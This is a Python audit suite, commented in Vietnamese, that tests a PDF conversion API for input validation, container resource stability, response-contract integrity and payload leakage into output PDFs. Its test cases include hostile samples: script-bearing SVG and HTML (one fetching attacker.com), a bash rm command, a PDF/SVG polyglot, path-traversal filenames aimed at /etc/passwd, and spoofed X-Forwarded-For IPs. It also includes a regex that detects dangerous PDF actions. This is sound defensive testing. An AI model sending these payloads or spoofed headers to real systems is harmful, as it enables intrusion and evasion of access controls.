#!/usr/bin/env python3
"""
ENTERPRISE PDF CONVERSION SECURITY & ROBUSTNESS AUDIT SUITE
=============================================================================
Kiểm thử toàn diện 4 trụ cột an toàn bảo mật cho hệ thống xử lý tài liệu:
1. Input Validation: Extension Whitelist, MIME/Magic Bytes sniffing (HTTP Content-Type vs Magic),
   Polyglot, Path Traversal (Unix, Windows, URL-encoded, Nested).
2. Resource Monitoring & Container State Verification:
   - RAM Tracking (Kernel cgroup v2): Đo Peak RAM, Retained RAM (độ trôi sau settling).
   - CPU Profiling: Đo thời gian CPU (usage_usec) & ước tính % tải lõi CPU.
   - Container State Machine: Nhận diện Crash ngầm, OOM-Killed, RestartCount, Container Recreated.
3. Protocol & Contract Integrity:
   - Tách bạch HTTP Status, JSON Schema Contract, và Semantic Anomaly.
   - Bắt lỗi schema nghiêm ngặt cho cả 200, 4xx và 5xx.
4. Output Security & Test Harness Hardening:
   - Tự bảo vệ test harness chống path traversal khi đọc file output.
   - Delimiter-aware regex scanner phân tích cú pháp PDF Name object.
   - Đánh giá trung thực, không overclaim kết quả kiểm thử.
=============================================================================
"""

import os
import sys
import time
import json
import uuid
import glob
import re
import argparse
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = os.getenv("API_BASE_URL", "http://localhost:8000")
WORKSPACE_DIR = Path(__file__).resolve().parent.parent.parent
TEST_FILES_DIR = WORKSPACE_DIR / "malicious-pdf" / "output"
DOWNLOADS_DIR = WORKSPACE_DIR / "downloads"

# Regex nhận diện PDF Name token chuẩn theo phân cách đặc tả PDF:
# Token kết thúc bằng delimiter: khoảng trắng, <, [, /, (, ), >, ], {, }
PDF_NAME_TOKEN_REGEX = re.compile(
    rb'/(JS|JavaScript|Launch|GoToE|GoToR|SubmitForm|ImportData|RichMedia|AA|OpenAction)(?=[\s<\[/(){}>\]])'
)


class ContainerMonitor:
    """Theo dõi tài nguyên container trực tiếp qua cgroup v2 & docker inspect (0ms latency)."""

    def __init__(self, service_name="gotenberg"):
        self.service_name = service_name
        self.cid = None
        self.full_id = None
        self.cgroup_path = None
        self._find_container()

    def _find_container(self):
        try:
            out = subprocess.check_output(
                ["docker", "ps", "-q", "--filter", f"name={self.service_name}"],
                stderr=subprocess.DEVNULL
            ).decode().strip().split("\n")
            if out and out[0]:
                self.cid = out[0]
                self.full_id = subprocess.check_output(
                    ["docker", "inspect", "-f", "{{.Id}}", self.cid],
                    stderr=subprocess.DEVNULL
                ).decode().strip()
                scope_path = f"/sys/fs/cgroup/system.slice/docker-{self.full_id}.scope"
                if os.path.exists(scope_path):
                    self.cgroup_path = scope_path
        except Exception:
            self.cid = None
            self.full_id = None
            self.cgroup_path = None

    def get_metrics(self):
        """Trả về snapshot {cid, full_id, ram_mb, cpu_usec, restarts, oom_killed, status}"""
        if not self.cid:
            self._find_container()
            if not self.cid:
                return {
                    "cid": "NONE",
                    "full_id": "NONE",
                    "ram_mb": 0.0,
                    "cpu_usec": 0,
                    "restarts": 0,
                    "oom_killed": False,
                    "status": "stopped"
                }

        ram_mb = 0.0
        cpu_usec = 0
        restarts = 0
        oom_killed = False
        status = "unknown"

        # 1. Đọc RAM & CPU từ cgroup v2 (0ms)
        if self.cgroup_path:
            try:
                mem_file = os.path.join(self.cgroup_path, "memory.current")
                if os.path.exists(mem_file):
                    with open(mem_file, "r") as f:
                        ram_mb = int(f.read().strip()) / (1024 * 1024)

                cpu_file = os.path.join(self.cgroup_path, "cpu.stat")
                if os.path.exists(cpu_file):
                    with open(cpu_file, "r") as f:
                        for line in f:
                            if line.startswith("usage_usec"):
                                cpu_usec = int(line.split()[1])
                                break
            except Exception:
                pass

        # 2. Đọc State từ Docker Inspect
        try:
            inspect_out = subprocess.check_output(
                ["docker", "inspect", "-f", "{{.RestartCount}}|{{.State.OOMKilled}}|{{.State.Status}}", self.cid],
                stderr=subprocess.DEVNULL
            ).decode().strip()
            parts = inspect_out.split("|")
            if len(parts) == 3:
                restarts = int(parts[0])
                oom_killed = parts[1].lower() == "true"
                status = parts[2]
        except Exception:
            self._find_container()

        return {
            "cid": self.cid[:12] if self.cid else "NONE",
            "full_id": self.full_id or "NONE",
            "ram_mb": round(ram_mb, 2),
            "cpu_usec": cpu_usec,
            "restarts": restarts,
            "oom_killed": oom_killed,
            "status": status
        }


def send_multipart_file(url, field_name, file_name, file_bytes, content_type="application/octet-stream", timeout=25, client_ip="10.99.0.1"):
    """Gửi multipart form data với khả năng tùy biến Content-Type cho từng file để test MIME Spoofing."""
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
    body = bytearray()

    if field_name and file_name:
        body.extend(f"--{boundary}\r\n".encode("utf-8"))
        body.extend(f'Content-Disposition: form-data; name="{field_name}"; filename="{file_name}"\r\n'.encode("utf-8"))
        body.extend(f"Content-Type: {content_type}\r\n\r\n".encode("utf-8"))
        body.extend(file_bytes)
        body.extend(b"\r\n")
    body.extend(f"--{boundary}--\r\n".encode("utf-8"))

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-Forwarded-For": client_ip
    }

    req = urllib.request.Request(url, data=bytes(body), headers=headers)
    start_time = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            elapsed = time.time() - start_time
            raw = res.read().decode("utf-8", errors="replace")
            try:
                data = json.loads(raw)
            except Exception:
                data = {"raw": raw}
            return res.status, data, elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start_time
        raw = e.read().decode("utf-8", errors="replace")
        try:
            data = json.loads(raw)
        except Exception:
            data = {"raw": raw}
        return e.code, data, elapsed
    except urllib.error.URLError as e:
        elapsed = time.time() - start_time
        return 0, {"error": str(e.reason)}, elapsed
    except TimeoutError:
        elapsed = time.time() - start_time
        return 408, {"error": "Request timed out"}, elapsed
    except Exception as e:
        elapsed = time.time() - start_time
        return 500, {"error": str(e)}, elapsed


def scan_pdf_payloads(pdf_bytes):
    """Quét tìm các dictionary token nguy hiểm trong file PDF theo chuẩn phân cách PDF Name."""
    matches = PDF_NAME_TOKEN_REGEX.findall(pdf_bytes)
    return sorted(list(set(m.decode("ascii") for m in matches)))


def validate_contract_and_schema(http_status, resp_data):
    """
    Phân định rạch ròi giữa HTTP Status và Schema hợp đồng JSON:
    - 200 OK: success=True, filename, download_url, size > 0.
    - 400, 415, 422: success=False, detail (non-empty string).
    - 500, 502, 503: Phân biệt cấu trúc lỗi hợp lệ (detail string) hay JSON rác / raw HTML.
    """
    if not isinstance(resp_data, dict):
        return False, "INVALID_NON_JSON_RESPONSE"

    success_val = resp_data.get("success")

    if http_status == 200:
        if success_val is not True:
            return False, "ANOMALY_HTTP200_SUCCESS_FALSE"
        if not resp_data.get("download_url") or not resp_data.get("filename"):
            return False, "ANOMALY_HTTP200_MISSING_FIELDS"
        if resp_data.get("size", 0) <= 0:
            return False, "ANOMALY_HTTP200_ZERO_SIZE"
        return True, "CONTRACT_VALID_SUCCESS"

    elif http_status in (400, 415, 422):
        if success_val is not False:
            return False, "ANOMALY_HTTP4XX_SUCCESS_TRUE"
        if not resp_data.get("detail") or not isinstance(resp_data.get("detail"), str):
            return False, "ANOMALY_HTTP4XX_MISSING_DETAIL"
        return True, "CONTRACT_VALID_REJECTION"

    elif http_status in (500, 502, 503):
        if "detail" in resp_data and isinstance(resp_data["detail"], str):
            return True, "HANDLED_SERVER_ERROR_SCHEMA"
        return False, "INVALID_SERVER_ERROR_SCHEMA"

    return False, f"UNEXPECTED_STATUS_{http_status}"


def build_test_cases():
    """Xây dựng bộ test cases toàn diện gồm repo samples + các vector tấn công chuyên sâu."""
    test_cases = []

    # 1. 70 test case từ repo malicious-pdf
    if TEST_FILES_DIR.exists():
        for p in sorted(list(TEST_FILES_DIR.iterdir()), key=lambda x: (x.suffix, x.name)):
            test_cases.append({
                "type": "MALICIOUS_PDF_REPO",
                "filename": p.name,
                "content_type": "application/pdf" if p.suffix == ".pdf" else "image/svg+xml",
                "bytes": p.read_bytes(),
                "desc": f"Repository Case: {p.name}"
            })

    # 2. Bộ tấn công nâng cao (MIME Spoofing ở HTTP layer, Polyglot, Deep Path Traversal, Empty)
    svg_sample = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("xss")</script></svg>'
    sh_sample = b'#!/bin/bash\nrm -rf /tmp/exploit\n'
    html_sample = b'<!DOCTYPE html><html><body><script>fetch("http://attacker.com")</script></body></html>'
    polyglot_sample = b'%PDF-1.4\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    valid_minimal_pdf = b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF'

    advanced_vectors = [
        # --- A. MIME Spoofing ở HTTP Layer ---
        {
            "type": "MIME_SPOOF_SVG_AS_PDF",
            "filename": "fake_pdf_really_svg.pdf",
            "content_type": "application/pdf",
            "bytes": svg_sample,
            "desc": "MIME Spoof: Header HTTP Content-Type=application/pdf nhưng body=SVG"
        },
        {
            "type": "MIME_SPOOF_BASH_AS_DOCX",
            "filename": "fake_docx_really_script.docx",
            "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "bytes": sh_sample,
            "desc": "MIME Spoof: Header HTTP Content-Type=DOCX nhưng body=Bash script"
        },
        {
            "type": "MIME_SPOOF_HTML_AS_PDF",
            "filename": "fake_pdf_really_html.pdf",
            "content_type": "application/pdf",
            "bytes": html_sample,
            "desc": "MIME Spoof: Header HTTP Content-Type=application/pdf nhưng body=HTML"
        },
        # --- B. Polyglot & Resource limit ---
        {
            "type": "POLYGLOT_PDF_SVG",
            "filename": "polyglot_svg.pdf",
            "content_type": "application/pdf",
            "bytes": polyglot_sample,
            "desc": "Polyglot: Header PDF-1.4 lồng mã độc SVG"
        },
        {
            "type": "EMPTY_FILE_ZERO_BYTES",
            "filename": "zero_bytes.pdf",
            "content_type": "application/pdf",
            "bytes": b"",
            "desc": "Resource Limit: File rỗng 0 bytes"
        },
        # --- C. Deep Path Traversal Matrix ---
        {
            "type": "PATH_TRAVERSAL_UNIX",
            "filename": "../../../../etc/passwd.pdf",
            "content_type": "application/pdf",
            "bytes": valid_minimal_pdf,
            "desc": "Path Traversal: Unix ../../../../etc/passwd.pdf"
        },
        {
            "type": "PATH_TRAVERSAL_MIDPATH",
            "filename": "documents/../../secret.pdf",
            "content_type": "application/pdf",
            "bytes": valid_minimal_pdf,
            "desc": "Path Traversal: Midpath documents/../../secret.pdf"
        },
        {
            "type": "PATH_TRAVERSAL_WINDOWS",
            "filename": "..\\..\\windows\\system32\\calc.pdf",
            "content_type": "application/pdf",
            "bytes": valid_minimal_pdf,
            "desc": "Path Traversal: Windows backslash ..\\..\\calc.pdf"
        },
        {
            "type": "PATH_TRAVERSAL_URLENCODED",
            "filename": "%2e%2e%2f%2e%2e%2fetc%2fpasswd.pdf",
            "content_type": "application/pdf",
            "bytes": valid_minimal_pdf,
            "desc": "Path Traversal: URL-encoded %2e%2e%2f"
        },
        {
            "type": "PATH_TRAVERSAL_NESTED",
            "filename": "....//....//etc/passwd.pdf",
            "content_type": "application/pdf",
            "bytes": valid_minimal_pdf,
            "desc": "Path Traversal: Nested ....//....//"
        }
    ]

    test_cases.extend(advanced_vectors)
    return test_cases


def run_security_audit():
    """Chế độ 1: Kiểm thử chi tiết từng vector bảo mật, đo lường RAM settling & CPU."""
    print("=" * 105)
    print(" 🛡️  HỆ THỐNG KIỂM THỬ BẢO MẬT & ĐỘ BỀN TOÀN DIỆN (SECURITY AUDIT SUITE)")
    print(f" Target API: {BASE_URL}/api/convert/file")
    print(f" Downloads Root: {DOWNLOADS_DIR.resolve()}")
    print("=" * 105)

    monitor = ContainerMonitor("gotenberg")
    init_stats = monitor.get_metrics()
    print(f"[*] Gotenberg Container CID: {init_stats['cid']} (Full ID: {init_stats['full_id'][:16]}...)")
    print(f"[*] Baseline RAM: {init_stats['ram_mb']} MB | Restarts: {init_stats['restarts']} | Status: {init_stats['status']}\n")

    test_cases = build_test_cases()
    total_tests = len(test_cases)
    results = []

    print(f"{'#':<4} | {'Test Name':<30} | {'HTTP':<5} | {'Schema Contract':<22} | {'PeakΔ':<8} | {'RetainΔ':<8} | {'CPU(ms)':<8} | {'Output Sanitization':<18} | {'Flag'}")
    print("-" * 135)

    for idx, tc in enumerate(test_cases, 1):
        stats_before = monitor.get_metrics()

        status, resp, elapsed = send_multipart_file(
            f"{BASE_URL}/api/convert/file",
            "file",
            tc["filename"],
            tc["bytes"],
            content_type=tc["content_type"],
            timeout=25,
            client_ip=f"10.88.{idx // 250}.{idx % 250 + 1}"
        )

        stats_immediate = monitor.get_metrics()

        # Cho phép tiến trình xả bộ đệm (settling window)
        time.sleep(0.35)
        stats_settled = monitor.get_metrics()

        # Tính toán RAM và CPU
        peak_ram_delta = round(stats_immediate["ram_mb"] - stats_before["ram_mb"], 2)
        retained_ram_delta = round(stats_settled["ram_mb"] - stats_before["ram_mb"], 2)
        cpu_time_ms = round((stats_immediate["cpu_usec"] - stats_before["cpu_usec"]) / 1000.0, 1)

        # Kiểm tra sự cố Container (Restart, OOM, Recreated)
        restarts_delta = stats_settled["restarts"] - stats_before["restarts"]
        oom_triggered = stats_settled["oom_killed"]
        container_recreated = (
            stats_before["full_id"] != "NONE"
            and stats_settled["full_id"] != "NONE"
            and stats_before["full_id"] != stats_settled["full_id"]
        )

        # Validate Schema & Contract
        schema_valid, contract_tag = validate_contract_and_schema(status, resp)

        # 4. Output Security & Test Harness Hardening (Chống Path Traversal trong Test Runner)
        sanitization_verdict = "N/A (REJECTED)"
        if status == 200 and isinstance(resp, dict) and resp.get("filename"):
            raw_out_filename = resp["filename"]
            candidate_path = DOWNLOADS_DIR / raw_out_filename
            try:
                resolved_path = candidate_path.resolve()
                downloads_root = DOWNLOADS_DIR.resolve()

                # Kiểm tra test harness containment
                if not resolved_path.is_relative_to(downloads_root):
                    sanitization_verdict = "EXPLOIT:PATH_ESCAPE"
                elif resolved_path.exists():
                    out_bytes = resolved_path.read_bytes()
                    in_tokens = scan_pdf_payloads(tc["bytes"])
                    out_tokens = scan_pdf_payloads(out_bytes)

                    if in_tokens and not out_tokens:
                        sanitization_verdict = "TOKEN_SCAN_CLEAN"
                    elif out_tokens:
                        sanitization_verdict = f"LEAKED: {','.join(out_tokens)}"
                    else:
                        sanitization_verdict = "CLEAN_STATIC"
                else:
                    sanitization_verdict = "OUTPUT_NOT_FOUND"
            except Exception as e:
                sanitization_verdict = f"FS_ERROR: {str(e)[:12]}"

        # Đánh giá Flag
        is_safe = True
        flag = "[PASS]"

        if oom_triggered or restarts_delta > 0 or container_recreated:
            is_safe = False
            flag = "[CRASH/RECREATED]"
        elif not schema_valid:
            is_safe = False
            flag = "[CONTRACT_BUG]"
        elif "LEAKED" in sanitization_verdict or "EXPLOIT" in sanitization_verdict:
            is_safe = False
            flag = "[LEAK_VULN]"
        elif status in (500, 502, 503):
            is_safe = False
            flag = "[SERVER_5XX]"
        elif status in (400, 415, 422):
            flag = "[BLOCKED]"
        elif status == 200:
            flag = "[CONVERTED]"

        results.append({
            "idx": idx,
            "name": tc["filename"],
            "desc": tc["desc"],
            "status": status,
            "schema_valid": schema_valid,
            "contract_tag": contract_tag,
            "peak_ram_delta": peak_ram_delta,
            "retained_ram_delta": retained_ram_delta,
            "cpu_time_ms": cpu_time_ms,
            "restarts_delta": restarts_delta,
            "oom": oom_triggered,
            "container_recreated": container_recreated,
            "sanitization": sanitization_verdict,
            "flag": flag,
            "is_safe": is_safe
        })

        print(
            f"[{idx:02d}] {tc['filename'][:30]:<30} | {status:<5} | {contract_tag:<22} | "
            f"{peak_ram_delta:>+6.1f}MB | {retained_ram_delta:>+6.1f}MB | {cpu_time_ms:>6.1f}ms | "
            f"{sanitization_verdict:<18} | {flag}"
        )

    # =========================================================================
    # TỔNG KẾT BÁO CÁO KIỂM THỬ
    # =========================================================================
    print("\n" + "=" * 105)
    print(" 📊 TỔNG KẾT BÁO CÁO KIỂM THỬ BẢO MẬT & ĐỘ BỀN (SECURITY AUDIT MATRIX)")
    print("=" * 105)

    total = len(results)
    converted_clean = sum(1 for r in results if r["status"] == 200 and r["is_safe"])
    safely_blocked = sum(1 for r in results if r["status"] in (400, 415, 422) and r["is_safe"])
    crashes_or_recreated = sum(1 for r in results if r["oom"] or r["restarts_delta"] > 0 or r["container_recreated"])
    contract_anomalies = sum(1 for r in results if not r["schema_valid"])
    server_5xx = sum(1 for r in results if r["status"] in (500, 502, 503))
    payload_leaks = sum(1 for r in results if "LEAKED" in r["sanitization"] or "EXPLOIT" in r["sanitization"])

    final_stats = monitor.get_metrics()
    ram_drift = round(final_stats["ram_mb"] - init_stats["ram_mb"], 2)

    print(f"1. Tổng số vector kiểm thử thực hiện       : {total}")
    print(f"2. Chuyển đổi an toàn (Status 200)          : {converted_clean}")
    print(f"   (Quét tĩnh không phát hiện token nguy hiểm trong output PDF)")
    print(f"3. Chặn an toàn (HTTP 400 / 415 / 422)      : {safely_blocked}")
    print(f"   (Chặn MIME spoofing, extension mismatch, file hỏng, polyglot)")
    print(f"4. Vi phạm hợp đồng JSON (Contract Mismatch): {contract_anomalies}")
    print(f"5. Lỗi máy chủ nội bộ (HTTP 5xx)            : {server_5xx}")
    print(f"6. Rò rỉ Payload nguy hiểm ra Output        : {payload_leaks}")
    print(f"7. Sự cố Container (OOM / Restart / Died)   : {crashes_or_recreated}")
    print(f"8. Biến động RAM Container Gotenberg        : {init_stats['ram_mb']} MB ➔ {final_stats['ram_mb']} MB (Net drift: {ram_drift:>+5.2f} MB)")
    print("-" * 105)

    if crashes_or_recreated == 0 and contract_anomalies == 0 and server_5xx == 0 and payload_leaks == 0:
        print("✅ KẾT LUẬN AUDIT:")
        print("   Không phát hiện sự cố (Crash, OOM, Token leak, Contract anomaly) trong các vector kiểm thử đã thực hiện.")
        print("   * Lưu ý quan trọng: Kết quả này không đồng nghĩa hệ thống an toàn tuyệt đối.")
        print("     Cần tiếp tục duy trì sandboxing và kiểm thử nâng cao (Fuzzing, Network Egress Isolation, Memory stress).")
    else:
        print("⚠️ CẢNH BÁO AUDIT:")
        print("   Phát hiện điểm yếu bảo mật hoặc sự cố tài nguyên cần xử lý (Xem chi tiết bảng trên).")

    print("=" * 105)
    return results


def run_concurrency_stress(concurrency=10, rounds=3):
    """Chế độ 2: Kiểm thử đồng thời (Concurrency Stress Test) chống Worker/Connection pool exhaustion."""
    print("=" * 80)
    print(f" ⚡ BẮT ĐẦU KIỂM THỬ TẢI ĐỒNG THỜI (CONCURRENCY STRESS TEST - {concurrency} WORKERS)")
    print(f" Target API: {BASE_URL}/api/convert/file")
    print("=" * 80)

    monitor = ContainerMonitor("gotenberg")
    init_stats = monitor.get_metrics()
    print(f"[*] Baseline Container State: RAM={init_stats['ram_mb']} MB | Restarts={init_stats['restarts']}\n")

    sample_pdf = b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF"

    def worker_task(task_id):
        fname = f"concurrent_stress_{task_id}.pdf"
        st, res, el = send_multipart_file(
            f"{BASE_URL}/api/convert/file",
            "file",
            fname,
            sample_pdf,
            content_type="application/pdf",
            timeout=30,
            client_ip=f"10.77.1.{task_id % 250}"
        )
        return task_id, st, el, res

    total_tasks = concurrency * rounds
    print(f"[*] Đang gửi {total_tasks} requests đồng thời ({concurrency} requests/round x {rounds} rounds)...")

    start_all = time.time()
    task_results = []
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(worker_task, i) for i in range(1, total_tasks + 1)]
        for f in as_completed(futures):
            task_results.append(f.result())

    total_elapsed = time.time() - start_all
    final_stats = monitor.get_metrics()

    success_cnt = sum(1 for r in task_results if r[1] == 200)
    error_cnt = sum(1 for r in task_results if r[1] != 200)
    avg_latency = sum(r[2] for r in task_results) / len(task_results) if task_results else 0.0

    print(f"\n[*] Kết quả Concurrency Stress:")
    print(f"    - Tổng thời gian hoàn thành : {total_elapsed:.2f}s")
    print(f"    - Thông lượng (Throughput)  : {total_tasks / total_elapsed:.2f} req/s")
    print(f"    - Độ trễ trung bình/req    : {avg_latency:.2f}s")
    print(f"    - Thành công (Status 200)   : {success_cnt}/{total_tasks}")
    print(f"    - Thất bại / Lỗi (Non-200)  : {error_cnt}/{total_tasks}")
    print(f"    - Trạng thái RAM Gotenberg  : {init_stats['ram_mb']} MB ➔ {final_stats['ram_mb']} MB")
    print(f"    - Container Restarts Delta  : {final_stats['restarts'] - init_stats['restarts']}")
    print("=" * 80)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PDF Conversion Security & Robustness Audit Suite")
    parser.add_argument("--mode", choices=["audit", "stress", "all"], default="audit", help="Chế độ kiểm thử (audit/stress/all)")
    parser.add_argument("--concurrency", type=int, default=10, help="Số luồng đồng thời cho stress mode")
    args = parser.parse_args()

    if args.mode in ("audit", "all"):
        run_security_audit()
    if args.mode in ("stress", "all"):
        run_concurrency_stress(concurrency=args.concurrency)
